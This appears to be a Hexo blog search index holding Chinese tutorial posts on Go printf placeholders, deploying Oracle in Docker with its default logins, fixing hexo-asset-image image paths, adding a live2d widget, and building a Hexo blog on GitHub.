class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串与字节切片</span><br><span class="line">占位符                说明                                  举例                           输出</span><br><span class="line">%s           输出字符串表示（string类型或者[]byte） printf（“%s”,[]byte(&quot;GO语言&quot;)）     GO语言</span><br><span class="line">%q           安全转义                               printf(&quot;%q&quot;,&quot;go语言&quot;)                “go语言”</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署Oracle</title>
      <link href="/2018/09/05/docker-bu-shu-oracle/"/>
      <url>/2018/09/05/docker-bu-shu-oracle/</url>
      
        <content type="html"><![CDATA[<h1 id="Oracle部署"><a href="#Oracle部署" class="headerlink" title="Oracle部署"></a>Oracle部署</h1><h2 id="第一部：准备工作"><a href="#第一部：准备工作" class="headerlink" title="第一部：准备工作"></a><strong>第一部：准备工作</strong></h2><p>一、<strong>环境准备</strong></p><p>①　操作系统：Ubuntu 14.04</p><p>②　Docker 版本只适合Ubuntu 14.04</p><p>二、<strong>安装包准备</strong></p><p>①　安装包名：oracle_install.tar.gz</p><h2 id="第二部：Oracle安装"><a href="#第二部：Oracle安装" class="headerlink" title="第二部：Oracle安装"></a><strong>第二部：Oracle安装</strong></h2><p>一、<strong>解压安装包</strong></p><p>①　tar  -zxvf  oracle_install.tar.gz</p><p>二、<strong>执行安装包</strong></p><p>①　cd  oracle </p><p>②　bash  oracle_install.sh</p><h2 id="第三部：服务参数介绍"><a href="#第三部：服务参数介绍" class="headerlink" title="第三部：服务参数介绍"></a><strong>第三部：服务参数介绍</strong></h2><p>一、<strong>ssh远程服务</strong></p><p>①　用户名：root</p><p>②　密码：secret</p><p>③　端口：49160</p><p>④　ssh  root@ip  -p  49160</p><p>二、<strong>Oracle数据库</strong></p><p>①　Hostname: localhost</p><p>②　sid : xe</p><p>③　端口：1521</p><p>④　username: system</p><p>⑤　password: secret</p><p>三、<strong>Tomcat管理</strong></p><p>①　Url: <a href="http://localhost:8080/manager" target="_blank" rel="noopener">http://localhost:8081/manager</a></p><p>②　User : ADMIN</p><p>③　Password : secret</p><p>四、<strong>Oracle Application Express web management</strong></p><p>①　Url: <a href="http://localhost:8080/ords/apex" target="_blank" rel="noopener">http://localhost:8081/ords/apex</a></p><p>②　Worksqpce :INTERNAL</p><p>③　User : ADMIN</p><p>④　Password: secret</p><h2 id="第四部：连接数据库"><a href="#第四部：连接数据库" class="headerlink" title="第四部：连接数据库"></a><strong>第四部：连接数据库</strong></h2><p>一、<strong>配置linux客户端</strong></p><p>①　下载cx_Oracle模块</p><p>②　连接数据库（你会发现正常是无法连接的，执行脚本后按照提示去下载）</p><p><img src="/.io//1.png" alt="img"> </p><p><img src="/.io//2.png" alt="img"> </p><p>③　下载客户端，版本我选择18.3，是向下兼容的，所以可以选择新版本。</p><p>④　创建并解压：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/oracle</span><br><span class="line"><span class="built_in">cd</span> /opt/oracle</span><br><span class="line">unzip instantclient-basic-linux.x64-18.3.0.0.0.zip</span><br></pre></td></tr></table></figure></div><p>⑤　下载package：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaio1</span><br></pre></td></tr></table></figure></div><p>⑥　写入配置：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> sudo sh -c <span class="string">"echo /opt/oracle/instantclient_18_3 &gt;  /etc/ld.so.conf.d/oracle-instantclient.conf"</span></span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure></div><p>⑦　添加环境变量</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExportLD_LIBRARY_PATH=/opt/oracle/instantclient_18_3:  <span class="variable">$LD_LIBRARY_PATH</span></span><br></pre></td></tr></table></figure></div><p>⑧　创建子目录</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/oracle/instantclient_12_2/network/admin</span><br></pre></td></tr></table></figure></div><p>⑨　连接Oracle数据库</p><p><img src="/.io//3.png" alt="img"> </p><p>二、<strong>配置windows客户端</strong></p><p> 如果安装了Oracle数据库并安装了客户端的可以忽略此步骤。</p><p><img src="/.io//4.png" alt="img"> </p><p>①　下载client</p><p><img src="/.io//5.png" alt="img"> </p><p>②　把zip压缩到 C:\oracle\instantclient_12_2</p><p>③　添加环境变量。把路径C:\oracle\instantclient_12_2添加。</p><p><img src="/.io//6.png" alt="img"> </p><p><img src="/.io//7.png" alt="img"> </p><p>④　下载Navicat Premium</p><p>⑤　配置Navicat Premium</p><p><img src="/.io//8.png" alt="img"> </p><p><img src="/.io//9.png" alt="img"> </p><p>⑥　重启Navicat Premium</p><p>⑦　创建连接</p><h2 id="第五部：导入dmp文件"><a href="#第五部：导入dmp文件" class="headerlink" title="第五部：导入dmp文件"></a><strong>第五部：导入dmp文件</strong></h2><p>一、<strong>上传dmp到服务器</strong></p><p>①　执行脚本ssh_scp_server</p><p>②　此脚本为上传dmp和远程到服务器。如果不想修改此脚本连接可以手动上传。</p><p>二、<strong>创建用户</strong></p><p>①　sqlplus system/secret</p><p>②　create  user  用户名  identified  by  密码；</p><p>③　grant  dba  to   用户名;  </p><p>三、<strong>创建表空间</strong></p><p>①　Create tablespace 表空间名称 datafile “${ORACLE_HOME}/xxx.dbf”  size 50m autoextend on;</p><p>②　这是linux语句，如果是windows，填写绝对路径加创建的文件就可以。</p><p>四、<strong>导入dmp</strong></p><p>①　使用imp导入</p><p><img src="/.io//10.png" alt="img"> </p><p>这样就成功能导入成功啦。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-asset-image的苦恼</title>
      <link href="/2018/08/20/hexo-asset-image-de-ku-nao/"/>
      <url>/2018/08/20/hexo-asset-image-de-ku-nao/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-asset-image的苦恼"><a href="#hexo-asset-image的苦恼" class="headerlink" title="hexo-asset-image的苦恼"></a>hexo-asset-image的苦恼</h1><p>博客搞定很激动，写博客加上图片就更奈斯了对不对。<br>可是很蛋疼的是，图片居然解析错了。我也很绝望啊！</p><h2 id="心路历程"><a href="#心路历程" class="headerlink" title="心路历程"></a>心路历程</h2><ul><li>图片放到一个文件夹里面  </li><li>写完md后自己解析图片路径</li></ul><h2 id="百度结果"><a href="#百度结果" class="headerlink" title="百度结果"></a>百度结果</h2><ul><li>使用工具 hexo-asset-image</li></ul><h2 id="hexo-asset-image"><a href="#hexo-asset-image" class="headerlink" title="hexo-asset-image"></a>hexo-asset-image</h2><ul><li>修改_config.yml (post_asset_folder:true)  </li><li>当我们执行 hexo n “title”  </li><li>在source/_posts下面会生成一个xxx.md和一个xxx文件夹</li><li>xxx文件夹是我们md需要引入的图片目录</li></ul><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save (目前版本0.0.3)</span><br><span class="line">vim _config.yml</span><br><span class="line">hexo n <span class="string">"hexo-asset-image的苦恼"</span></span><br></pre></td></tr></table></figure></div><p>举例：hexo-asset-image的苦恼/1.jpg<br>我们markdown的时候需要引入图片1.jpg语法如下</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![图片1](1.jpg)</span><br></pre></td></tr></table></figure></div><p>没看出就是这么简单，接下来我们生成静态文件了。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure></div><p>在public/year(2018)/month/day/hexo-asset-image的苦恼/<br>这个目录下会有一个index.html,及1.jpg<br>我们查看一下index.html。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"/day/hexo-asset-image的苦恼/1.jpg"</span>&gt;”</span><br></pre></td></tr></table></figure></div><p>这个怎么解析？<br>不是应该这么解析嘛？</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"/year/month/day/hexo-asset-image的苦恼/1.jpg"</span>&gt;</span><br></pre></td></tr></table></figure></div><p>各种百度，兄弟怎么就没有一个给我解释的呢。<br>去愁一愁代码吧，在node_modules下面有一个hexo-asset-image<br>愁一愁index.js 纳尼，为毛是js。反正我是看不懂。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">    var link = data.permalink;</span><br><span class="line">        var beginPos = getPosition(link, <span class="string">'/'</span>, 3) + 1;</span><br><span class="line">        // In hexo 3.1.1, the permalink of <span class="string">"about"</span> page is like <span class="string">".../about/index.html"</span>.</span><br><span class="line">        var endPos = link.lastIndexOf(<span class="string">'/'</span>) + 1;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br></pre></td></tr></table></figure></div><p>我看不懂，我想大概意思应该是这样吧~<br>Permalink应该指的是_config.yml的吧。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permalink: :year/:month/:day/:title/</span><br></pre></td></tr></table></figure></div><p>我猜应该是这样的。可是我好奇你为啥是(‘/‘,3)</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var beginPos = getPosition(link, <span class="string">'/'</span>, 3) + 1;</span><br></pre></td></tr></table></figure></div><p>我获得的路径是/day/hexo-asset-image的苦恼/1.jpg<br>这个是从day开始分析的。<br>难道是这样year(第一个/)month(第二个/)day(第三个/)<br>所有就是从第三个/解析拼接的嘛。那我们修改成这样试一试。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var beginPos = getPosition(link, <span class="string">'/'</span>, 1) + 1;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure></div><p>再去愁一愁index.html的结果是啥样子。  </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"/year/month/day/hexo-asset-image的苦恼/1.jpg"</span>&gt;</span><br></pre></td></tr></table></figure></div><p>soga  原来是这样子啊。</p><h1 id="使用hexo-asset-image总结"><a href="#使用hexo-asset-image总结" class="headerlink" title="使用hexo-asset-image总结"></a>使用hexo-asset-image总结</h1><h2 id="1-安装hexo-asset-image"><a href="#1-安装hexo-asset-image" class="headerlink" title="1.安装hexo-asset-image"></a>1.安装hexo-asset-image</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure></div><h2 id="2-修改index-js"><a href="#2-修改index-js" class="headerlink" title="2.修改index.js"></a>2.修改index.js</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">路径 /node_moduls/hexo-asset-image/index.js</span><br><span class="line">修改配置  var beginPos = getPosition(link, <span class="string">'/'</span>, 1) + 1;</span><br></pre></td></tr></table></figure></div><h2 id="3-生成静态文件"><a href="#3-生成静态文件" class="headerlink" title="3.生成静态文件"></a>3.生成静态文件</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure></div><h2 id="4-查看网页是否正常解析"><a href="#4-查看网页是否正常解析" class="headerlink" title="4.查看网页是否正常解析"></a>4.查看网页是否正常解析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure></div><h2 id="5-推到GitHub"><a href="#5-推到GitHub" class="headerlink" title="5.推到GitHub"></a>5.推到GitHub</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo ds</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客添加hexo-live2d</title>
      <link href="/2018/08/17/gei-bo-ke-tian-jia-hexo-live2d/"/>
      <url>/2018/08/17/gei-bo-ke-tian-jia-hexo-live2d/</url>
      
        <content type="html"><![CDATA[<h1 id="安装live2d"><a href="#安装live2d" class="headerlink" title="安装live2d"></a>安装live2d</h1><p>先上图把，不然估计不知道是啥玩意呢。<br><img src="/.io//cat.png" alt="cat"></p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure></div><h2 id="修改根目录-config-yml"><a href="#修改根目录-config-yml" class="headerlink" title="修改根目录_config.yml"></a>修改根目录_config.yml</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  scriptFrom: <span class="built_in">local</span> <span class="comment"># 默认</span></span><br><span class="line">  pluginRootPath: live2dw/ <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  pluginJsPath: lib/ <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  pluginModelPath: assets/ <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  debug: <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-wanko <span class="comment"># npm-module package name</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br></pre></td></tr></table></figure></div><p>默认有一个自带模块，你可以根据自己喜欢选择模块</p><h2 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h2><ul><li>live2d-widget-model-chitose</li><li>live2d-widget-model-epsilon2_1</li><li>live2d-widget-model-gf</li><li>live2d-widget-model-haru/01 (use npm i1nstall –save live2d-widget-model-haru)</li><li>live2d-widget-model-haru/02 (use npm install –save live2d-widget-model-haru)</li><li>live2d-widget-model-haruto</li><li>live2d-widget-model-hibiki</li><li>live2d-widget-model-hijiki</li><li>live2d-widget-model-izumi</li><li>live2d-widget-model-koharu</li><li>live2d-widget-model-miku</li><li>live2d-widget-model-ni-j</li><li>live2d-widget-model-nico</li><li>live2d-widget-model-nietzsche</li><li>live2d-widget-model-nipsilon</li><li>live2d-widget-model-nito</li><li>live2d-widget-model-shizuku</li><li>live2d-widget-model-tororo</li><li>live2d-widget-model-tsumiki</li><li>live2d-widget-model-unitychan</li><li>live2d-widget-model-wanko</li><li>live2d-widget-model-z16<br>安装 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install 模型的包名</span><br></pre></td></tr></table></figure></div></li></ul><p>修改_config.yml</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use : 安装的模块名称</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> live2d </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何创建你的hexo博客</title>
      <link href="/2018/08/17/ru-he-chuang-jian-ni-de-hexo-bo-ke/"/>
      <url>/2018/08/17/ru-he-chuang-jian-ni-de-hexo-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="如何创建你的hexo博客"><a href="#如何创建你的hexo博客" class="headerlink" title="如何创建你的hexo博客"></a>如何创建你的hexo博客</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">也许搭建这套博客系统对小白来说有些麻烦吧，但重点它是免费的！没错你没听错，免费的！那还要啥自行车啊.  </span><br><span class="line">还是乖乖充钱买腾讯云，阿里云吧。简单粗暴找一套博客系统解决所有问题，还要什么hexo+github呢。</span><br><span class="line">没钱的话还是给我老老实实自己布吧。</span><br></pre></td></tr></table></figure></div><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.系统：mac/win/linux(你开心就好，随便挑随便选)</span><br><span class="line"></span><br><span class="line">2.软件：git，node.js</span><br><span class="line"></span><br><span class="line">3.GitHub账号密码</span><br></pre></td></tr></table></figure></div><h2 id="2-下载git"><a href="#2-下载git" class="headerlink" title="2.下载git"></a>2.下载git</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows 自行官网下载。  </span><br><span class="line">Linux利用命令安装。mac已经自带git，在我印象中是这样的。</span><br></pre></td></tr></table></figure></div><h2 id="3-下载node-js"><a href="#3-下载node-js" class="headerlink" title="3.下载node.js"></a>3.下载node.js</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.官网下载选择LTS 长期维护版本</span><br><span class="line">2.输入node -v 有版本说明安装成功了。  </span><br><span class="line">windows最好是利用git操作。</span><br></pre></td></tr></table></figure></div><p><img src="/.io//node.jpg" alt="node"></p><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g  (坐等就可以了)</span><br></pre></td></tr></table></figure></div><p><img src="/.io//hexo-v.jpg" alt="hexo -v"></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建并进入你要存放hexo文件的目录再执行下面代码</span><br><span class="line">hexo init  （初始化）</span><br></pre></td></tr></table></figure></div><h2 id="5-安装主题"><a href="#5-安装主题" class="headerlink" title="5.安装主题"></a>5.安装主题</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fi3ework/hexo-theme-archer   </span><br><span class="line">我使用的是这位作者的主题，具体安装过程我就不冗余了。他GitHub上都写的很清楚了。</span><br><span class="line">修改好自己的地址。</span><br></pre></td></tr></table></figure></div><h2 id="6-配置git"><a href="#6-配置git" class="headerlink" title="6.配置git"></a>6.配置git</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/superGG1990/p/6844952.html</span><br><span class="line">推荐看这个文章，已经码不下去了，写的有点乱。因为自己当初没写笔记。遇见很多问题各种百度解决的，等我写东西我已经忘记了。</span><br></pre></td></tr></table></figure></div><p><img src="/.io//config1.jpg" alt="config"></p><h2 id="7-配置hexo"><a href="#7-配置hexo" class="headerlink" title="7.配置hexo"></a>7.配置hexo</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo s --debug   你可以在本地http://127.0.0.1:4000 来访问你的本地博客</span><br><span class="line">hexo clearn &amp;&amp; hexo g &amp;&amp; hexo d   把你的文件pull到GitHub上了。</span><br><span class="line">访问你的站点就可以预览了。username.github.io</span><br><span class="line">推荐一篇自行学习原谅我懒</span><br><span class="line">https://www.cnblogs.com/visugar/p/6821777.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
